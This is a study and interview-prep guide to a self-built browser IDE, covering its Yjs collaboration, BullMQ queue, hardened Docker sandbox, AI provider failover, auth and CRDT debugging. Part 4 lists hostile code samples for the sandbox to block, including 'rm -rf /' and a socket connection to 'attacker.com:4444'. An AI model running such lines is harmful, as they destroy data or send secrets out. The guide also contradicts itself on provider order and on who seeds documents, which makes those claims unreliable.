# SAM Compiler — Complete Deep-Dive Guide
### *"Explain it like you built it, because you did."*

---

## 🧠 PART 0 — What Is SAM Compiler? (The 30-Second Pitch)

SAM (Syntax Analysis Machine) is a **distributed, browser-based code execution IDE**.

Think of it like a lite version of Replit or CodeSandbox, but you built the *entire execution engine* from scratch.

**What it does in plain English:**
1. User opens the browser → types code in Monaco Editor (same as VS Code)
2. Clicks "Run" → code goes to your API server
3. API pushes the job into a **queue** (BullMQ/Redis)
4. A **Worker** picks it up, spins up an **isolated Docker container**, runs the code safely
5. Logs stream back in real-time through **WebSockets**
6. Multiple users editing the same session are synced via **Yjs CRDT**
7. If they want AI help → it tries **Gemini first, then OpenAI** (multi-provider failover)

**The one-line interview answer:**
> "SAM Compiler is a distributed cloud IDE with a decoupled control/data plane — the API never executes code directly; it delegates to hardened Docker sandboxes via a persistent BullMQ queue, syncs collaborative state via Yjs CRDTs, and has a multi-provider AI failover so it never goes offline."

---

## 🏗️ PART 1 — System Architecture (The Big Picture)

```
Browser (React + Monaco)
     │
     ▼ WebSocket (Socket.IO)
API Server (Express — Control Plane)
     │              │
     │              ▼
     │         Redis (BullMQ Queue)
     │              │
     │              ▼
     │         Worker (Data Plane)
     │              │
     │              ▼
     │         Docker Container (Sandbox)
     │              │
     │              ▼ (Redis Pub/Sub)
     └──────────────┘
     (logs streamed back to browser)
```

**Why "Decoupled Control/Data Plane"?**

Because the API (Control Plane) is just a traffic manager. It never runs user code.
The Worker (Data Plane) is the only thing that touches the Docker sandbox.
If the Worker crashes, the API doesn't crash. If the API restarts, jobs already in the queue don't get lost.

---

## 🔄 PART 2 — CRDT / Yjs (Collaborative Code Editing)

### What file handles this?
`apps/api/src/modules/runs/socketHandler.js` — lines 103–201

### What is Yjs?

Yjs is a **CRDT library** (Conflict-free Replicated Data Type).

Imagine two users both typing in the same code editor at the same time:

```
User A types: "hello"  at position 0
User B types: "world"  at position 0 (simultaneously)
```

**Without CRDT:** You get "Code Soup" — one update overwrites the other. Last-write-wins destroys data.

**With Yjs CRDT:** Both operations are recorded as mathematical operations with timestamps and author IDs. They are **merged deterministically** — both "hello" and "world" are in the document, in a consistent order, on every client, without any server arbitration.

### Why Yjs specifically? What would break with Automerge?

| Feature | **Yjs** | **Automerge** |
|---|---|---|
| **Encoding** | Binary (compact BSON-friendly) | JSON (verbose) |
| **Performance** | Sub-10ms sync for large docs | Slower for large history |
| **y-socket.io** | ✅ Native adapter exists | ❌ Would need custom transport |
| **Persistence** | Binary state → store in MongoDB as `Buffer` | JSON → much larger MongoDB docs |
| **"Code Soup" healing** | Server can detect and repair corrupted Y.Text | Harder to inspect binary state |

**The real killer:** `y-socket.io` package. This is a drop-in adapter that connects Yjs to Socket.IO. If you switched to Automerge, you'd have to write the entire WebSocket sync protocol yourself.

**What you actually built in `socketHandler.js`:**
```js
const ysocket = new YSocketIO(io);

// When doc is loaded → pull from MongoDB
ysocket.on("document-loaded", async (doc) => {
  const state = await ProjectStateModel.findOne({ sessionId });
  if (state) Y.applyUpdate(doc, state.binaryState);
});

// When doc changes → debounce + save to MongoDB
ysocket.on("document-update", (doc) => {
  // 2-second debounce so we're not spamming the DB on every keystroke
  setTimeout(() => {
    const binaryState = Buffer.from(Y.encodeStateAsUpdate(doc));
    ProjectStateModel.findOneAndUpdate({ sessionId }, { binaryState });
  }, 2000);
});
```

**Problem you faced & solved: "Code Soup" (Race Condition)**
When two users joined the same room, Yjs would merge their edits and cause duplicated templates (`print("Welcome!")print("Welcome!")`). 

- **Legacy "Band-Aid" Fix (Server-Side Healer):** The backend would check the document on load. If the template appeared more than once, it would delete the entire document and re-insert the template. This was fragile and would wipe real code if it resembled the template.
- **The Ultimate Architectural Fix:**
  1. **Remove Premature Seeding:** We removed the synchronous `editor.setValue()` call on client mount. Calling `setValue()` *before* establishing `MonacoBinding` was forcing Monaco to treat the local `localStorage` buffer as a local user insertion, which then merged with the server document.
  2. **Yjs Sync Event Seeding:** In `CodeEditor.jsx`, we hooked into the Yjs provider's `'sync'` event. We only seed the room with the default template or local buffer if the shared room is confirmed to be **genuinely empty** on the server after a full sync (`ytext.length === 0`).
  3. **Backend Alignment:** Cleaned up the backend `socketHandler.js` initialization to let the first client do the seeding. This eliminated the dual-insertion conflict entirely. Yjs is now the strict single source of truth.

> **Out-loud test:** Close this. Now explain: *"Why can't I just use a shared variable on the server for collaborative editing?"*
> Answer: Because your API has multiple instances (horizontal scaling). Instance A has user 1, instance B has user 2. They're in different memory spaces. Yjs + Redis adapter syncs them. A shared server variable is just a race condition.

---

## 📡 PART 3 — BullMQ Queue (The Execution Pipeline)

### What files handle this?
- `apps/api/src/modules/runs/runs.queue.js` — Queue definition
- `apps/api/src/modules/runs/runs.service.js` — Job creation logic
- `apps/worker/src/worker.js` — Job consumption

### Why BullMQ over raw Redis Pub/Sub?

**Raw Redis Pub/Sub would work like this:**
```
API: PUBLISH job:execute { code: "print('hi')" }
Worker: (subscribed) runs the code
```

**The race condition it creates:**
1. User clicks "Run" at 12:00:00.000
2. API publishes to Redis Pub/Sub
3. Worker is momentarily disconnected (redeploy, timeout, etc.)
4. Message is **gone forever** — fire and forget
5. User waits forever, no response, no error, no retry

**BullMQ is a persistent job queue built on Redis.**

```
API: queue.add("execute", { runId: "abc123" }) → stored in Redis
Worker: picks up job → if crash → job goes back to queue → retried
```

| Concern | Raw Pub/Sub | BullMQ |
|---|---|---|
| **Persistence** | ❌ Lost if worker is offline | ✅ Job stays in Redis until consumed |
| **Retry on crash** | ❌ Manual logic needed | ✅ Built-in retry/backoff |
| **Concurrency control** | ❌ All workers get every message | ✅ `concurrency: 3` — max 3 parallel jobs per worker |
| **Job status** | ❌ No native tracking | ✅ `waiting/active/completed/failed` states |
| **Deduplication** | ❌ None | ✅ Can deduplicate by jobId |

**Your actual queue setup in `runs.service.js`:**
```js
// Check if a Docker-capable worker is alive
const heartbeatRaw = await redis.get("sam:worker:heartbeat");
const workerOnline = JSON.parse(heartbeatRaw).hasDocker === true;

if (queue && workerOnline) {
  // PRIMARY: Push to BullMQ → Worker picks up
  await queue.add("execute", { runId: run._id.toString() });
} else {
  // FALLBACK: Use Piston (external cloud executor) directly
  const result = await executeViaPiston(runData, emitLog);
}
```

**The heartbeat pattern** (elegant):
Worker writes to `sam:worker:heartbeat` every 5 seconds with `SETEX` (TTL: 15s).
If the API reads that key and it exists AND `hasDocker === true` → worker is alive and capable.
If the key is expired → worker is dead → fall back to Piston.
This is a **dead man's switch**.

> **Out-loud test:** Close this. Now explain: *"What happens if I press Run and the Worker crashes mid-execution?"*
> Answer: The job's status in MongoDB is `"running"`. BullMQ marks the job `failed`. The Worker's `worker.on("failed")` fires. The user's socket sees no "end" event, so the terminal hangs. The current solution: the worker catches errors in the `finally` block and always emits `publishLog("end", ...)`. On a crash (process.exit), the job goes back to BullMQ queue and gets retried. This is why BullMQ > Pub/Sub.

---

## 🐳 PART 4 — Docker Sandbox (The Security Fortress)

### What file handles this?
`apps/worker/src/sandbox/executeNodeRun.js`

### What is the security risk Docker isolation prevents?

**Without Docker:** When user writes this code:
```python
import os
os.system("rm -rf /")  # Destroys the host filesystem
```
or:
```python
while True: pass  # Fork bomb variant — maxes CPU to 100%
```
or:
```python
import socket
s = socket.socket()
s.connect(("attacker.com", 4444))  # Exfiltrates your cloud credentials
```

All of this runs **directly on your server**. Every user is root on your machine.

**With Docker + your hardening flags:**
```js
const dockerArgs = [
  "--rm",                          // Container auto-deleted after exit
  "--network", "none",             // ZERO network access. Can't phone home.
  "--memory", env.RUN_MEMORY,      // Max 256MB RAM. Fork bomb contained.
  "--cpus", env.RUN_CPUS,          // CPU throttled. Can't max out host.
  "--pids-limit", "50",            // Max 50 processes. No fork bombs.
  "--read-only",                   // Filesystem is immutable.
  "--cap-drop", "ALL",             // All Linux capabilities dropped (no sudo, no mount, etc.)
  "--security-opt", "no-new-privileges", // Can't escalate to root
  "--tmpfs", "/tmp:rw,noexec,nosuid,size=64m", // Temp dir: no execute permission
  "-u", "1000:1000",               // Run as non-root user (UID 1000)
];
```

**Each flag explained:**

| Flag | What it prevents |
|---|---|
| `--network none` | Exfiltration, reverse shells, DDoS from your IP |
| `--memory 256m` | Memory exhaustion (OOM) of the host |
| `--cpus 0.5` | CPU starvation — fork bombs only hurt themselves |
| `--pids-limit 50` | Process fork bombs (`fork(); fork(); fork()...`) |
| `--read-only` | Writing malware to disk, modifying the image |
| `--cap-drop ALL` | `CAP_SYS_ADMIN`, `CAP_NET_RAW` etc. — kernel escalation |
| `--security-opt no-new-privileges` | `setuid` binaries can't gain root |
| `-u 1000:1000` | Even if they escape, they're not root on the host |

**The `path traversal` attack you also block:**
```js
function sanitizeRelPath(p) {
  const parts = normalized.split("/").filter(Boolean);
  const safeParts = parts.filter(seg => seg !== "." && seg !== ".." && !seg.includes(":"));
}
```
Without this, a user could name their file `../../etc/passwd` and your code would try to write to `/etc/passwd` on the host before Docker even runs.

> **Out-loud test:** Close this. Now explain: *"Why mount the code as `:ro` (read-only) and then copy it inside the container?"*
> Answer: The code directory is mounted as `/workspace-host:ro` (read-only). Inside the container, it does `cp -r /workspace-host/. /workspace/`. The working directory `/workspace` is a `tmpfs` (in-memory, no exec). This means user code can't escape by writing a file that gets picked up by the host. The host mount is truly immutable.

---

## 🧠 PART 5 — AI Multi-Provider Failover (The "Never Goes Offline" Engine)

### What file handles this?
`apps/api/src/modules/ai/ai.service.js`

### What is the problem it solves?

Single AI provider = single point of failure.

If you only use OpenAI:
- OpenAI 429 (rate limit) → AI is dead for your user
- OpenAI 503 (overloaded) → AI is dead
- API key expired → AI is dead

**Your solution: Provider Rotation with Waterfall Fallback**

```
Phase 1 (Fastest): All OpenAI gpt-4o-mini keys → All Gemini gemini-1.5-flash keys
Phase 2 (Fallback): All OpenAI gpt-4o keys → All Gemini gemini-1.5-pro keys
Phase 3 (Last resort): Offline mode (simulated streaming message)
```

```js
// Build the provider list dynamically from env keys
openAIKeys.forEach(key => providers.push({ type: "openai", key, model: "gpt-4o-mini" }));
geminiKeys.forEach(key => providers.push({ type: "gemini", key, model: "gemini-1.5-flash" }));
// ...then fallback models

for (let i = 0; i < Math.min(providers.length, 4); i++) {
  try {
    await streamGemini/streamOpenAI(providers[i], context, onChunk);
    return; // ✅ SUCCESS — stop trying
  } catch (err) {
    logger.warn(`Provider ${i+1} failed: ${err.message}`);
    // Continue to next provider
  }
}
triggerOfflineFallback(onChunk); // All failed — graceful degradation
```

**The tradeoff you made:**
- `maxAttempts = 4` — you only try 4 providers max. Why not all?
- Because if all 10 of your keys are rate-limited, trying all 10 adds 10+ seconds of latency before showing the user an error. 4 is the sweet spot: fast enough to be imperceptible if 1-2 fail, but doesn't make users wait forever.

**Streaming (not batch response):**
Both providers use `stream: true`. This means the AI response starts appearing letter-by-letter, making latency feel ~3x shorter psychologically even though total time is the same.

---

## 🔒 PART 6 — Authentication (JWT + GitHub OAuth + Password Reset)

### What files handle this?
- `apps/api/src/modules/auth/auth.service.js`
- `apps/api/src/config/passport.js` (GitHub OAuth)

### The JWT flow:
1. User registers with email/password → password is `bcrypt`-hashed (never stored raw)
2. On login → `jwt.sign({ id, email, role }, JWT_SECRET, { expiresIn: "7d" })`
3. Token is sent back to browser, stored in `localStorage`
4. Every WebSocket connection sends `token` in `handshake.auth`
5. Server does `jwt.verify(token, JWT_SECRET)` → extracts `{ id, email, role }`

**Why both JWT and sessions for GitHub OAuth?**
GitHub OAuth uses Passport.js which is session-based. After the GitHub callback, you generate a JWT and redirect to the frontend with it in the URL query string. The frontend reads it, stores it, and drops the session. Stateless from that point on.

**Password reset (SHA-256 pattern):**
```js
const resetToken = crypto.randomBytes(32).toString("hex"); // Raw token → emailed
const hashedToken = crypto.createHash("sha256").update(resetToken).digest("hex");
user.resetPasswordToken = hashedToken; // Hashed version → stored in DB
```
Why hash it? If your MongoDB is compromised, the attacker can't use the hashed token directly — they'd need to find its SHA-256 preimage. The raw token is only ever in the email link, never in the DB.

---

## 🌐 PART 7 — WebSocket Architecture (Real-Time Log Streaming)

### The flow from "Run" click to terminal output:

```
1. Browser emits: socket.emit("exec:start", { language, code, stdin })
2. API auto-subscribes socket to room: socket.join(`run:${jobId}`)
3. API subscribes to Redis channel: redisSubscriber.subscribe(`run:logs:${jobId}`)
4. BullMQ Worker picks job → docker runs → logs come out
5. Worker publishes: redis.publish(`run:logs:${jobId}`, JSON.stringify({type:"stdout", chunk:"Hello!"}))
6. API's redisSubscriber receives → calls emitLog()
7. emitLog() calls: io.to(`run:${jobId}`).emit("exec:log", { type, chunk })
8. Browser receives → appends to terminal
```

**The "late joiner" problem — Log Buffering:**
What if the WebSocket connection takes 200ms to establish, but the code finishes in 100ms?
The logs are gone before the socket is ready.

**Your fix:** `logBuffers` map — every log is buffered for 10 seconds after job completion.
```js
// When socket subscribes to a job that's already running/done:
if (logBuffers.has(jobId)) {
  const bufferedLines = logBuffers.get(jobId);
  bufferedLines.forEach(log => socket.emit("exec:log", log)); // Replay
}
```

**The memory leak prevention:**
```js
// Every 60 seconds, garbage collect buffers older than 5 minutes
setInterval(() => {
  for (const [jobId, timestamp] of jobTimestamps.entries()) {
    if (timestamp < Date.now() - 5 * 60 * 1000) {
      logBuffers.delete(jobId);
      redisSubscriber.unsubscribe(`run:logs:${jobId}`);
    }
  }
}, 60000);
```

---

## 📐 PART 8 — The Monorepo Architecture

```
SAM-Compiler/
├── apps/
│   ├── api/     → Express server (Control Plane)
│   ├── worker/  → BullMQ worker + Docker orchestration (Data Plane)  
│   └── web/     → React + Vite + Monaco (Frontend)
├── packages/
│   └── shared/  → Shared constants, types (used by both api and web)
└── docker-compose.yml
```

**Why monorepo?**
- `packages/shared` is imported by both `apps/api` and `apps/web`. No duplication.
- Single `npm install` at root installs everything.
- One `docker-compose up` spins the entire stack.

**The Docker Compose architecture:**
```yaml
services:
  mongo:    # Persistent data store
  redis:    # Queue backbone + pub/sub
  api:      # Control plane (depends_on: mongo healthy, redis healthy)
  worker:   # Data plane (depends_on: mongo healthy, redis healthy)
            # Has: /var/run/docker.sock mounted — this is how it spawns containers!
  web:      # Nginx serving React build (depends_on: api)
```

**The Docker socket mount risk:**
```yaml
worker:
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock
```

This is the **Docker-in-Docker** pattern. The worker container has access to the host's Docker daemon. This is needed so the worker can `docker run` sandboxed containers.

**The security risk:** If a user escapes the inner sandbox AND finds the socket... they could spawn privileged containers. This is why `--cap-drop ALL`, `--no-new-privileges`, `--network none` are critical. Defense-in-depth.

---

## 🚧 PART 9 — Problems Faced & How You Solved Them

| # | Problem | Root Cause | Solution |
|---|---|---|---|
| 1 | **"Code Soup"** — template code duplicated | Premature `editor.setValue()` called before `MonacoBinding` sync injected local storage buffers, which merged with server state. | Established binding first; wait for Yjs `'sync'` event and only seed if `ytext.length === 0` after sync. |
| 2 | **Logs lost if client connects after job completes** | Fire-and-forget publish, socket not ready in time | `logBuffers` Map — replay buffered logs on subscription |
| 3 | **Worker offline → UI hangs forever** | No fallback if BullMQ worker is down | Piston (external executor) as cloud fallback; heartbeat dead-man's switch |
| 4 | **Memory leak** from abandoned log buffers | Jobs finish but nobody unsubscribes | 60-second TTL GC loop cleaning buffers older than 5min |
| 5 | **"Code Soup" from path traversal** | User names file `../../etc/passwd` | `sanitizeRelPath()` strips all `..` and `:` characters |
| 6 | **MongoDB 16MB BSON limit** for large Yjs docs | Yjs binary state grows with edit history | Hard check: reject persistence if > 10MB |
| 7 | **Circular dependency** between `runs.service` and `socketHandler` | Both imported each other at module load | Lazy `require()` inside functions instead of top-level imports |
| 8 | **Cloud platform (Render) sleeping** after inactivity | Free tier cold start = 30sec delay | Self-ping heartbeat every 5 minutes to both `localhost` and public URL |
| 9 | **AI provider 429 / rate limits** | Single API key exhausted | Multi-key rotation across multiple providers |
| 10 | **WebSocket dropped by cloud load balancer** | Nginx/Render proxy timeout | Custom `sam:ping` keep-alive event every 10s |

---

## ⚖️ PART 10 — Key Tradeoffs You Made

### 1. Yjs binary state in MongoDB vs. Operational Transform (OT)
- **Chose:** Yjs CRDT binary blobs in MongoDB
- **Tradeoff:** Binary is not human-readable in DB. You can't query "what text is in room X?" without deserializing.
- **Why it's right:** OT (like Google Docs uses) requires a central server to order operations. CRDTs are peer-to-peer friendly and simpler to implement correctly.

### 2. BullMQ vs. direct async execution on API
- **Chose:** BullMQ queue
- **Tradeoff:** Added Redis as a dependency; adds ~50ms queue latency
- **Why it's right:** Without a queue, if 100 users run code simultaneously, your API's event loop blocks. Node.js is single-threaded for CPU-bound work.

### 3. Docker-in-Docker vs. gVisor/Firecracker/Nsjail
- **Chose:** Docker spawning from mounted socket
- **Tradeoff:** Worker has access to host Docker daemon (privileged-ish)
- **Why it's right:** gVisor/Firecracker require kernel modifications not available on basic cloud VMs. Docker + hardening flags is the 80/20 solution.

### 4. Piston as cloud fallback vs. Judge0
- **Chose:** Piston (open source, self-hostable)
- **Tradeoff:** Piston's public endpoint has rate limits and occasional downtime
- **Why it's right:** Piston supports more languages out of the box and has no mandatory API key for public usage. Judge0 requires account setup.

### 5. Redis adapter for Socket.IO disabled by default
- **Chose:** Memory adapter (single-node) as default; Redis adapter optional via `ENABLE_REDIS_ADAPTER=true`
- **Tradeoff:** Doesn't support horizontal scaling without the env var
- **Why it's right:** Redis adapter duplicates every event through Redis — on Upstash free tier this burns through the 500K command/day limit. Single instance covers 99% of use cases.

---

## 📅 PART 11 — Study Plan (How Many Days?)

### Total: **12–15 Days** of focused study

---

### **Days 1–2: Foundations**
- What is a monorepo? Why `npm workspaces`?
- What is Express.js middleware pipeline? (helmet, cors, rateLimit, compression)
- What is JWT? How does `jwt.sign` and `jwt.verify` work?
- What is bcrypt? Why not MD5 for passwords?

**Goal:** Explain `app.js` from top to bottom without looking.

---

### **Days 3–4: Real-Time & WebSockets**
- What is Socket.IO vs raw WebSocket?
- What is a Room in Socket.IO? (`socket.join`, `io.to(room).emit`)
- How does the log streaming pipeline work? (Worker → Redis Pub/Sub → Socket → Browser)
- The log buffer and replay pattern

**Goal:** Trace a single "Run" button click through all 8 steps in Part 7.

---

### **Days 5–6: CRDTs & Yjs**
- What is a CRDT vs Operational Transform?
- How does `Y.Doc`, `Y.Text`, `Y.encodeStateAsUpdate`, `Y.applyUpdate` work?
- What is `y-socket.io`?
- The debounced MongoDB persistence pattern
- The "Code Soup" problem and server-side healer

**Goal:** Explain why two users typing simultaneously don't conflict, and what the "Code Soup" bug was.

---

### **Days 7–8: Queues & BullMQ**
- What is a job queue? Why does it solve the Node.js blocking problem?
- How does BullMQ store jobs in Redis?
- What is the worker heartbeat (dead man's switch) pattern?
- Worker → Primary; Piston → Fallback flow
- Concurrency: `concurrency: 3` means what?

**Goal:** Explain what happens if the Worker crashes mid-execution with a job already picked up.

---

### **Days 9–10: Docker Security**
- Container vs VM — what's the difference?
- Explain each Docker flag: `--network none`, `--cap-drop ALL`, `--read-only`, `--pids-limit`
- What is a cgroup? What does `--memory 256m` actually enforce?
- The path traversal attack and `sanitizeRelPath`
- The Docker socket mount and why it's a calculated risk

**Goal:** Given a malicious code snippet, explain exactly which Docker flag prevents it.

---

### **Days 11–12: AI & Multi-Provider**
- What is streaming vs batch in AI APIs?
- The provider rotation waterfall: Phase 1 → Phase 2 → Offline
- `withRetry()` — which HTTP codes are retryable and why?
- Client caching with Maps (why not create `new OpenAI()` on every request?)
- The `maxAttempts = 4` tradeoff

**Goal:** Explain why `streaming: true` feels faster even though total latency is the same.

---

### **Days 13–14: Architecture & Deployment**
- What does `docker-compose` do? Trace all 5 services.
- `depends_on` with `condition: service_healthy` — why is this critical?
- The `healthcheck` for MongoDB and Redis — what does `mongosh --eval "db.adminCommand('ping')"` actually test?
- Horizontal scaling with Redis adapter for Socket.IO
- Graceful shutdown: SIGTERM → stop accepting → drain → close DB → exit

**Goal:** Draw the architecture from memory including data flows.

---

### **Day 15: Mock Interview**
Have someone ask you these questions cold:
1. "What is SAM Compiler?"
2. "Why Yjs over Automerge?"
3. "Why BullMQ over raw Redis Pub/Sub?"
4. "What security risk does Docker isolation prevent?"
5. "What happens if your Worker crashes mid-execution?"
6. "Describe a bug you faced and how you fixed it."
7. "What are the limitations of your current approach?"

---

## 🎯 The One Thing To Remember

Every decision in SAM Compiler follows one principle:

> **The API should never be a point of failure.** 
> - It doesn't execute code (that's the Worker)
> - It doesn't lose state on restart (Redis + MongoDB hold it)  
> - It doesn't crash if one AI provider goes down (multi-provider)
> - It doesn't lose jobs if the Worker restarts (BullMQ persists them)

That's distributed systems thinking. That's what makes this project impressive.

---

## 🛠️ PART 12 — Case Study: Debugging CRDT Desyncs Like a Senior Engineer

*The following is a breakdown of how to approach complex synchronization bugs, specifically the "Code Soup" race condition and the `\r\n` ghost character bug.*

### Phase 1: Stop and Diagnose BEFORE Touching Code

A junior dev sees an error and immediately starts changing things. A senior dev first builds a **complete mental model** of the system.

**Draw the Data Flow:**
```
Browser (Monaco Editor)
        ↕  [Yjs CRDT]
WebSocket Server (Render)
        ↕  [Persistence]
Database / Room State
```

You need to answer these questions **before** writing a single line:
- Who owns the document state? (Only one entity should)
- At what exact moment does each actor write to the document?
- What happens if two writes arrive at the same millisecond?
- What happens on reconnect? On page refresh? On reset?

### Phase 2: Reproduce Reliably Before Fixing

The biggest mistake is fixing a bug you've only seen once. A senior dev asks: *"Can I make this happen on demand?"*

**For the Code Soup bug:**
1. Open two browser tabs
2. Tab A: Has `"syed"` saved in the room
3. Tab B: Fresh load — watch what Monaco renders
4. Throttle your network to "Slow 3G" in DevTools
5. Reload Tab B — the race condition becomes 10x more visible

**For the Ghost Characters bug:**
1. Paste text with Windows line endings (`\r\n`) deliberately
2. Click Reset
3. Inspect if ghost chars appear
4. Check character count BEFORE and AFTER reset in console

### Phase 3: Understand WHY at the Deepest Level

#### The CRDT Race Condition — Deep Dive
Yjs is a **Conflict-free Replicated Data Type**. It will never *crash* from conflicts, but it will *merge* them.
At the millisecond level:
```
T=0ms    Page loads
T=1ms    Monaco mounts → client code injects "Welcome to SAM Compiler"
T=2ms    Yjs connects to server WebSocket
T=3ms    Server sends saved state: "syed"
T=3ms    Yjs merges T=1ms state + T=3ms state simultaneously
T=3ms    Result: "Welsyed<" ← CRDT merge of two concurrent inserts
```
The root issue is **you had two writers with no coordination protocol.**

#### The \r\n Bug — Deep Dive
```javascript
// What you thought was happening:
ytext.delete(0, ytext.length)  // "delete everything"

// What actually happened:
// Monaco stored "syed\r\n}" = 7 bytes
// Yjs counted  "syed\n}"   = 6 bytes  
// So delete(0, 6) left the last byte (\r or }) untouched
```
This is a **encoding boundary mismatch** — two systems using different internal representations of the same logical character.

### Phase 4: Design the Fix Architecturally

A senior dev doesn't write a fix. They write a **policy**.

#### Policy 1: Single Source of Truth (Server Wins)
- **Rule:** The server is the ONLY entity allowed to initialize document content.
- **Rule:** The client NEVER writes boilerplate. It only writes user input.
- **Rule:** On new room → server inserts template exactly once.
- **Rule:** On existing room → server sends saved state, client renders it.

#### Policy 2: Monaco Owns Its Own Document Mutations
- **Rule:** Never calculate Monaco document length yourself.
- **Rule:** Never manually handle line endings.
- **Rule:** Monaco's `executeEdits()` is the ONLY way to programmatically change content.
- **Rule:** Yjs binding listens to Monaco changes — not the other way around.

```javascript
// ✅ RIGHT — Monaco calculates its own length, Yjs listens
const fullRange = editor.getModel().getFullModelRange()
editor.executeEdits('reset', [{
  range: fullRange,      
  text: DEFAULT_TEMPLATE // Monaco handles \r\n internally
}])
// The y-monaco binding fires automatically and syncs to Yjs perfectly.
```

### Phase 5: Test Like a Senior Dev

Write **test cases** for every failure scenario:
- **Fresh room, first user:** Boilerplate appears once (Open new room URL)
- **Existing room, returning user:** Saved code appears (Save code, close tab, reopen)
- **Two users open same room:** Both see identical content (Two browsers, same URL)
- **User hits Reset:** Clean template, no ghosts (Paste garbage, hit reset)
- **Network drops mid-session:** Reconnect, no corruption (DevTools → offline → online)

### Phase 6: Add Observability (Don't Be Blind)

You add **logging** so you can see what's happening without guessing.
```javascript
ydoc.on('update', (update, origin) => {
  console.log('[Yjs]', {
    origin,
    contentLength: ytext.length,
    contentPreview: ytext.toString().slice(0, 50)
  })
})
```

### Phase 7: The Senior Dev Mindset Checklist

Before closing any bug, ask yourself:
- [x] Can I reproduce the bug on demand?
- [x] Do I understand WHY it happened, not just WHAT happened?
- [x] Is my fix a policy/architecture, or just a patch?
- [x] Does my fix handle ALL edge cases (reconnect, slow network, reset)?
- [x] Have I added logging so I can see if it breaks again?
- [x] **Could this same bug class appear elsewhere in my codebase?**

*Junior dev: Fix the bug that's on fire.*
*Senior dev: Understand the system well enough that this class of bug becomes impossible.*
